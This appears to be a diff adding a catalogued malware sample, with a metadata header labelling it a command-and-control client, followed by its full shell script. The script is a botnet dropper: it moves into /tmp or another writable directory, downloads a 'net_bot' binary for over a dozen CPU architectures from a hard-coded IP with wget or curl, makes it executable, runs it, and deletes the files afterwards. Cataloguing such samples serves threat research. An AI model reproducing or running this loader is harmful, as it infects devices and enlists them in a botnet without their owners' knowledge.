@@ -1,0 +1,42 @@
+# sha256: 39be6853a8204ce6455a373a6ffb4cb4672d4a62d90be69f7d6eeb66cda10b96
+# family: c2_client
+# kind: script
+# size_bytes: 3241
+# first_seen: 2026-09-14 03:17:21.977000 UTC
+# times_seen: 16
+# yara_matches: none
+# ------------------------------------------------------------
+
+#!/bin/sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
+wget http://160.119.66.206/bins/net.x86_64 -O net_bot && chmod 777 net_bot && ./net_bot net.x86_64 && exit;
+curl -L http://160.119.66.206/bins/net.x86_64 -o net_bot && chmod 777 net_bot && ./net_bot net.x86_64 && exit;
+wget http://160.119.66.206/bins/net.x86 -O net_bot && chmod 777 net_bot && ./net_bot net.x86 && exit;
+curl -L http://160.119.66.206/bins/net.x86 -o net_bot && chmod 777 net_bot && ./net_bot net.x86 && exit;
+wget http://160.119.66.206/bins/net.mips -O net_bot && chmod 777 net_bot && ./net_bot net.mips && exit;
+curl -L http://160.119.66.206/bins/net.mips -o net_bot && chmod 777 net_bot && ./net_bot net.mips && exit;
+wget http://160.119.66.206/bins/net.mpsl -O net_bot && chmod 777 net_bot && ./net_bot net.mpsl && exit;
+curl -L http://160.119.66.206/bins/net.mpsl -o net_bot && chmod 777 net_bot && ./net_bot net.mpsl && exit;
+wget http://160.119.66.206/bins/net.arm -O net_bot && chmod 777 net_bot && ./net_bot net.arm && exit;
+curl -L http://160.119.66.206/bins/net.arm -o net_bot && chmod 777 net_bot && ./net_bot net.arm && exit;
+wget http://160.119.66.206/bins/net.arm5 -O net_bot && chmod 777 net_bot && ./net_bot net.arm5 && exit;
+curl -L http://160.119.66.206/bins/net.arm5 -o net_bot && chmod 777 net_bot && ./net_bot net.arm5 && exit;
+wget http://160.119.66.206/bins/net.arm6 -O net_bot && chmod 777 net_bot && ./net_bot net.arm6 && exit;
+curl -L http://160.119.66.206/bins/net.arm6 -o net_bot && chmod 777 net_bot && ./net_bot net.arm6 && exit;
+wget http://160.119.66.206/bins/net.arm7 -O net_bot && chmod 777 net_bot && ./net_bot net.arm7 && exit;
+curl -L http://160.119.66.206/bins/net.arm7 -o net_bot && chmod 777 net_bot && ./net_bot net.arm7 && exit;
+wget http://160.119.66.206/bins/net.ppc -O net_bot && chmod 777 net_bot && ./net_bot net.ppc && exit;
+curl -L http://160.119.66.206/bins/net.ppc -o net_bot && chmod 777 net_bot && ./net_bot net.ppc && exit;
+wget http://160.119.66.206/bins/net.m68k -O net_bot && chmod 777 net_bot && ./net_bot net.m68k && exit;
+curl -L http://160.119.66.206/bins/net.m68k -o net_bot && chmod 777 net_bot && ./net_bot net.m68k && exit;
+wget http://160.119.66.206/bins/net.sh4 -O net_bot && chmod 777 net_bot && ./net_bot net.sh4 && exit;
+curl -L http://160.119.66.206/bins/net.sh4 -o net_bot && chmod 777 net_bot && ./net_bot net.sh4 && exit;
+wget http://160.119.66.206/bins/net.spc -O net_bot && chmod 777 net_bot && ./net_bot net.spc && exit;
+curl -L http://160.119.66.206/bins/net.spc -o net_bot && chmod 777 net_bot && ./net_bot net.spc && exit;
+wget http://160.119.66.206/bins/net.arc -O net_bot && chmod 777 net_bot && ./net_bot net.arc && exit;
+curl -L http://160.119.66.206/bins/net.arc -o net_bot && chmod 777 net_bot && ./net_bot net.arc && exit;
+wget http://160.119.66.206/bins/net.i686 -O net_bot && chmod 777 net_bot && ./net_bot net.i686 && exit;
+curl -L http://160.119.66.206/bins/net.i686 -o net_bot && chmod 777 net_bot && ./net_bot net.i686 && exit;
+wget http://160.119.66.206/bins/net.i486 -O net_bot && chmod 777 net_bot && ./net_bot net.i486 && exit;
+curl -L http://160.119.66.206/bins/net.i486 -o net_bot && chmod 777 net_bot && ./net_bot net.i486 && exit;
+rm -rf net_bot net_http.sh
